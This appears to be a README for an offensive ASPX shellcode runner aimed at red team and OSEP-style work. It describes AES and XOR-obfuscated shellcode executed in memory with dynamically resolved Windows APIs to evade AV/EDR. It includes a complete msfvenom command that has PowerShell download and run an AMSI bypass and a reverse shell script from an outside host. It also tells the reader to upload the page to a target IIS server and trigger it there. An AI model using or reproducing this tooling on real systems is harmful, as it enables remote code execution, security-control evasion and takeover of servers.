# ASPX Ultra-Stealth Shellcode Runner (OSEP Ready)

This project provides an **advanced ASPX shellcode runner** designed for **red team operations** and **OSEP-level** evasion techniques.  
It focuses on executing AES-256 encrypted and XOR-obfuscated shellcode in-memory using dynamic API resolution and minimal static indicators.

---

## 🚀 Features

- AES-256-CBC encryption of the shellcode
- XOR additional obfuscation
- Dynamic resolution of:
  - `LoadLibraryA`
  - `GetProcAddress`
  - `VirtualAlloc`
  - `CreateThread`
- Randomized chunked memory writing
- No direct import of Windows API functions
- No suspicious static strings
- Minimal signature footprint
- Designed for Red Team / OSEP practice labs
- Compatible with Windows Server and IIS environments

---

## 📚 How It Works

1. Shellcode is encrypted with AES-256 and then XOR-ed with a random byte.
2. The encrypted data is Base64-encoded and fragmented into small pieces.
3. At runtime:
   - Base64 strings are reconstructed.
   - XOR obfuscation is reversed.
   - AES decryption restores the original shellcode.
4. The shellcode is written into memory in random-sized chunks.
5. `CreateThread` is dynamically called to execute the payload.

---

## 🛠 Usage Instructions

### 1. Generate Your Shellcode

The payload used can vary depending on the engagement.

An example command used in this project is:

```bash
msfvenom -p windows/x64/exec CMD="powershell -ExecutionPolicy Bypass -NoProfile -Command \"Invoke-Expression (Invoke-WebRequest -Uri 'http://192.168.1.130/amsi.txt' -UseBasicParsing | Select-Object -ExpandProperty Content); \$scriptContent = [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri 'http://192.168.1.130/shell.ps1' -UseBasicParsing).Content); Invoke-Expression \$scriptContent\"" EXITFUNC=thread -f raw > shellcode.bin
```

> **Explanation:**  
> This payload first downloads and executes an **AMSI bypass** (`amsi.txt`) and then retrieves an **obfuscated reverse shell** (`shell.ps1`) to achieve maximum evasion against AV/EDR solutions.

---

### 2. Encrypt and Fragment the Shellcode

Use the provided Python script:

```bash
python3 AES_XOR_Encryptor.py
```

This script will:

- Encrypt your shellcode with AES-256-CBC.
- Apply XOR obfuscation.
- Base64 encode and fragment the data.
- Copy the generated ASPX code fragment to your clipboard.

---

### 3. Update the ASPX Runner

Paste the generated fragment inside the ASPX shellcode runner:

```csharp
// ====== PASTE HERE the generated fragment from AES_XOR_Encryptor.py ======
string[] x1 = { "..." };
string[] x2 = { "..." };
string[] x3 = { "..." };
byte xorKey = 0x5A;
```

---

### 4. Deploy

- Upload the `ASPX_Shellcode_Runner.aspx` file to a target IIS webserver.
- Access the page to trigger in-memory shellcode execution.

---

## ⚠️ Disclaimer

This project is intended **for educational purposes only**.  
Usage of this code in unauthorized environments is **strictly prohibited**.

The author assumes no responsibility for any misuse or damage caused by this tool.

---

## 📋 Notes

- Tested on Windows 10 with IIS 10.
- Ensure that your IIS server allows ASP.NET page execution.
- Recommended for controlled lab environments (e.g., OSEP, red team simulations).

---

## 📎 Files Included

| File | Description |
|:---|:---|
| `AES_XOR_Encryptor.py` | Python script to encrypt, obfuscate and fragment shellcode for the ASPX runner. |
| `ASPX_Shellcode_Runner.aspx` | Final ASPX page that dynamically decrypts, loads, and executes shellcode. |

---

